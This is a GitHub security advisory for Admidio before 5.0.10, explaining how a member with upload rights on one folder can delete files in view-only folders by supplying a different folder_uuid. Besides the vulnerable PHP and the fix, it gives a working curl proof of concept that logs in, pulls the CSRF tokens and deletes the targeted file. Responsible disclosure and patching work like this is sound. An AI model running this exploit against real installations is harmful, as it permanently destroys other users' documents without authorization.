# [M] Admidio: Authorization bypass in file_delete enables cross-folder file removal by authenticated users without delete privileges

## Summary
Severity: Medium
Advisory: GHSA-qc4c-hrmc-4f78
CVE: CVE-2026-47226
CWE: CWE-639, CWE-862
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-05-29
Source: https://github.com/advisories/GHSA-qc4c-hrmc-4f78
Type: github-advisory

## Affected
- Packagist: `admidio/admidio` — affected >=0 <5.0.10

## Details
### Summary

An authenticated Admidio member with upload rights on **any one folder** can permanently delete files from folders where they have only view access. The authorization check at the top of `modules/documents-files.php` evaluates upload rights against the attacker-supplied `folder_uuid` URL parameter — not the file's actual parent folder. The `file_delete` handler then only verifies view rights on the file's real location, never upload rights. By passing a folder they legitimately own in `folder_uuid` while targeting a file in a restricted folder via `file_uuid`, an attacker bypasses the upload-right check entirely and permanently deletes the file.

This is an **incomplete fix** of [GHSA-rmpj-3x5m-9m5f](https://github.com/Admidio/admidio/security/advisories/GHSA-rmpj-3x5m-9m5f), which was patched in v5.0.7 but remains exploitable in v5.0.9.

**Affected Version:** Admidio v5.0.9 

---

### Details

**Root Cause File:** `modules/documents-files.php`

**Issue 1 — `folder_uuid` is not required for `file_delete` mode (line 67):**

```php
$getFolderUUID = admFuncVariableIsValid($_GET, 'folder_uuid', 'uuid', array(
    'requireValue' => !in_array($getMode, array('list', 'file_delete', 'download'))
));
```

**Issue 2 — The top-level upload-right check loads the folder from the attacker-controlled URL parameter, not the file's actual parent folder (lines 79–88):**

```php
if ($getMode != 'list' && $getMode != 'download') {
    $folder = new Folder($gDb);
    $folder->getFolderForDownload($getFolderUUID);   // uses attacker-supplied UUID
    if (!$folder->hasUploadRight()) {
        $gMessage->show($gL10n->get('SYS_NO_RIGHTS'));
    }
}
```

**Issue 3 — The `file_delete` handler only checks view rights via `getFileForDownload()`. Upload rights on the file's actual folder are never verified (lines 165–178):**

```php
case 'file_delete':
    SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);
    $file = new File($gDb);
    $file->getFileForDownload($getFileUUID);   // view-only check, not upload
    $file->delete();
    echo json_encode(array('status' => 'success'));
    break;
```

`File::getFileForDownload()` in `src/Documents/Entity/File.php` checks only view-role membership — it never verifies upload rights.

---

### Attack Scenario

1. The organization has two folders: `PrivateFolder` (role A: view-only) and `UploadFolder` (role A: upload + view).
2. Attacker is a member of role A — they have legitimate upload access to `UploadFolder` only.
3. Attacker enumerates a file UUID in `PrivateFolder` using `file_list` mode, which is accessible to anyone with view rights.
4. Attacker sends a `file_delete` POST using `UploadFolder`'s UUID in `folder_uuid` and the `PrivateFolder` file UUID in `file_uuid`.
5. Server checks upload rights against `UploadFolder` → **passes**.
6. Server deletes the file from `PrivateFolder` **without ever checking upload rights there**.

**Prerequisites:**

- Authenticated Admidio member account
- Upload rights on at least one folder (legitimately assigned)
- View rights on the target folder (sufficient to enumerate file UUIDs via `file_list` mode)
- Knowledge of a target file UUID (obtainable from the folder listing)

---

### PoC

**Step 1 — Authenticate and obtain login CSRF token:**

```bash
curl -c /tmp/admidio_cookies.txt http://TARGET/system/login.php > /tmp/login.html

LOGIN_CSRF=$(grep -o 'name="adm_csrf_token"[^>]*value="[^"]*"' /tmp/login.html \
  | grep -o 'value="[^"]*"' | cut -d'"' -f2)

curl -b /tmp/admidio_cookies.txt -c /tmp/admidio_cookies.txt \
  -X POST "http://TARGET/system/login.php?mode=check" \
  -d "usr_login_name=MEMBER&usr_password=PASSWORD&adm_csrf_token=${LOGIN_CSRF}"
```

**Step 2 — Extract authenticated session CSRF token:**

```bash
AUTH_CSRF=$(curl -s -b /tmp/admidio_cookies.txt \
  "http://TARGET/system/file_upload.php?module=documents_files&uuid=UPLOAD_FOLDER_UUID" \
  | grep -oP 'name:\s*"adm_csrf_token",\s*value:\s*"\K[^"]+')
```

**Step 3 — Delete file from restricted folder using the upload folder UUID as bypass:**

```bash
curl -b /tmp/admidio_cookies.txt \
  -X POST "http://TARGET/modules/documents-files.php?mode=file_delete&file_uuid=PRIVATE_FILE_UUID&folder_uuid=UPLOAD_FOLDER_UUID" \
  -d "adm_csrf_token=${AUTH_CSRF}"
```

**Expected response:** `{"status":"success"}`

`testmember` holds upload rights **only** on `UploadFolder`. `secret2.txt` (UUID `93dc6280-...-bba7-...`) resided in `PrivateFolder` and was permanently deleted from both the database and filesystem.

---

### Impact

An authenticated Admidio member with legitimate upload access to **any one folder** can permanently delete files from **any other folder** to which they have view access — without authorization. In organizations where upload rights are delegated by role (e.g., team leads upload to their own folder, view-only everywhere else), this enables cross-folder sabotage and permanent destruction of shared documents.

**Business Impact:** Data loss, destruction of shared organizational documents, and compliance violations in organizations relying on Admidio for document management.

---

### Remediation

In the `file_delete` handler, after loading the file via `getFileForDownload()`, verify upload rights against the file's **actual parent folder** — not the URL-supplied `folder_uuid`:

```php
case 'file_delete':
    SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);
    $file = new File($gDb);
    $file->getFileForDownload($getFileUUID);
    // Verify upload rights on the file's actual parent folder
    $parentFolder = new Folder($gDb);
    $parentFolder->readDataById((int)$file->getValue('fil_fol_id'));
    if (!$parentFolder->hasUploadRight()) {
        $gMessage->show($gL10n->get('SYS_NO_RIGHTS'));
    }
    $file->delete();
    echo json_encode(array('status' => 'success'));
    break;
```

**Alternative fix:** Remove the top-level `folder_uuid` check for `file_delete` entirely and move a proper upload-rights verification into the `file_delete` case as the sole authority for authorization.

**Defense-in-depth recommendations:**

- Audit all other modes in `documents-files.php` (e.g., `folder_delete`, `file_rename`) for the same pattern of trusting `folder_uuid` from the URL instead of the resource's actual parent.
- Add an integration test asserting a user with upload rights on Folder A cannot perform destructive operations on files in Folder B.
- Consider centralizing authorization in a single helper (e.g., `assertUploadRightOnFile($fileUuid)`) to eliminate the URL-parameter trust-boundary issue across the codebase.

---

### Credits

- Researcher: Vishal Kumar B - https://github.com/VishaaLlKumaaRr - Security Researcher & Penetration Tester
- Disclosure: Responsible disclosure to Admidio maintainers

---

### References

- [GHSA-rmpj-3x5m-9m5f](https://github.com/Admidio/admidio/security/advisories/GHSA-rmpj-3x5m-9m5f) — Prior incomplete fix, patched in v5.0.7
- [CWE-862: Missing Authorization](https://cwe.mitre.org/data/definitions/862.html)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)

## References
- https://github.com/Admidio/admidio/security/advisories/GHSA-qc4c-hrmc-4f78
- https://github.com/Admidio/admidio/security/advisories/GHSA-rmpj-3x5m-9m5f
- https://github.com/Admidio/admidio
